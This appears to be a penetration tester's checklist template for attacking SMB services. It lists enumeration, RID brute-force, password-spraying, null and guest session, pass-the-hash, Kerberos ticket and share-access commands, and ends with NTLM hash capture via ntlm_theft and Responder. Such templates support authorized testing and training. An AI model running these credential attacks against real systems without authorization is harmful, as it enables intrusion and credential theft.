Template Version: 2025.09.06
### Versions:
- [ ] 
##### Exploit Search:

##### Findings:

---
### General Enumeration:
###### Commands:
- `sudo nbtscan -r <IP_range>`
- `sudo nmap -p 139,445 --script "smb*" <IP>`
- (Windows) `net view \\<HOST> /all`

---
### User Enumeration / RID Bruteforce:
###### User Enum:
- `netexec smb <IP> -u <user> -p <pwd> --users [--local-auth]`
###### RID Brute:
- Requirements: readable `IPC$` share (sometimes available to `guest`)
- Netexec: `netexec smb <IP> -u <user> -p <pwd> --rid-brute [--local-auth]`
- Impacket: `impacket-lookupsid '<user>:<pwd>@<domain.tld>'`
###### Findings:


---
### Password Spraying / Default Password Check:
###### Password Spray:
- `netexec smb <IP> -u users.txt -p '<pwd>' --continue-on-success [--local-auth]`
###### Default password:
- `netexec smb <IP> -u users.txt -p users.txt --no-brute --continue-on-success [--local-auth]`

| Password / Hash | Domain Auth | Local Auth |
| --------------- | ----------- | ---------- |
|                 |             |            |

---
### Access Enumeration:
###### Commands:
###### Null session:
- Netexec: `netexec smb <IP> -u '' -p '' --shares [--local-auth]`
- [ ] Checked domain auth
- [ ] Checked local auth
###### Anonymous session:
- Netexec: `netexec smb <IP> -u 'Anonymous' -p '' --shares [--local-auth]`
- [ ] Checked domain auth
- [ ] Checked local auth
###### Guest session:
- Netexec: `netexec smb <IP> -u 'Guest' -p '' --shares [--local-auth]`
- [ ] Checked domain auth
- [ ] Checked local auth
###### User authentication:
- NTLM password: `netexec smb <IP> -u '<user>' -p '<password>' --shares [--local-auth]`
- NTLM hash: `netexec smb <IP> -u <user> -H <NT> --shares [--local-auth]`
- Kerberos: `KRB5CCNAME=<cache> netexec smb <host.domain.tld> -d <domain.tld> -k --use-kcache --shares`
- Get TGT: `impacket-getTGT -dc-ip <IP> '<domain.tld>/<user>:<password>`
###### User checklist:
- [ ] 

###### Shares:

| Share | Description | Read | Write |
| ----- | ----------- | ---- | ----- |
|       |             |      |       |

---
### Share Enumeration:
###### NTLM password:
- `smbclient -U '[<host> | <domain>\]<user>%<password>' \\\\<host>\\<share>`
- `impacket-smbclient '<user>:<password>@<host>'`
###### NTLM hash:
- `smbclient \\\\<host>\\<share> -U <user> --pw-nt-hash <NT hash>`
###### Kerberos:
- `KRB5CCNAME=<cache> impacket-smbclient -k -dc-ip <IP> '<host.domain.tld>; use <SHARE>`


---
### NTLM Forced Authentication:
###### Commands:
- GitHub: https://github.com/Greenwolf/ntlm_theft.git 
- Command: `python ntlm_theft.py --generate all --server <LHOST> --filename exploit`
- Responder: `sudo responder -I tun0`

---
- [ ] Exploit search